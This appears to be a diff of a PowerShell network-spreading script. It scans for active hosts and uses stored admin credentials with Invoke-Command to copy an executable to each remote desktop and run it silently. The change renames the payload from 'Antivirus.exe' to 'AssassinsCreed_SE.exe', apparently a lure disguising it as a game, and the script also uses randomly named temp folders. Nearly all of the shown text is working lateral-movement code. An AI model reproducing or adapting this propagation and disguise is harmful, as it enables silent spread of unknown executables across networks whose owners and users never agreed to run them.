@@ -26,7 +26,7 @@ function Get-ActiveIPs {
 
 $wd = random_text
 $path = "$env:temp\$wd"
-$installer = "$path\Antivirus.exe"
+$installer = "$path\AssassinsCreed_SE.exe"
 $targets = Get-ActiveIPs
 $desktoppath = [System.Environment]::GetFolderPath("Desktop")
 
@@ -93,14 +93,14 @@ foreach ($target in $targets) {
         try {
             $randomFolder = [System.IO.Path]::Combine($env:TEMP, (Get-Random -Count 5 | ForEach-Object { [char]$_ } -join ''))
             New-Item -Path $randomFolder -ItemType Directory -ErrorAction Stop
-            Copy-Item -Path $installer -Destination "$randomFolder\Antivirus.exe" -ErrorAction Stop
+            Copy-Item -Path $installer -Destination "$randomFolder\AssassinsCreed_SE.exe" -ErrorAction Stop
             $desktoppath = [System.Environment]::GetFolderPath("Desktop")
 
             Invoke-Command -ComputerName $target -ScriptBlock {
                 param ($randomFolder, $desktoppath)
-                $tempInstallerPath = "$randomFolder\Antivirus.exe"
+                $tempInstallerPath = "$randomFolder\AssassinsCreed_SE.exe"
                 Copy-Item -Path $tempInstallerPath -Destination $desktoppath -ErrorAction Stop
-                Start-Process -FilePath "$desktoppath\Antivirus.exe" -ArgumentList "/silent" -Wait
+                Start-Process -FilePath "$desktoppath\AssassinsCreed_SE.exe" -ArgumentList "/silent" -Wait
             } -ArgumentList $randomFolder, $desktoppath -Credential $adminCreds -ErrorAction Stop
         }
         catch {
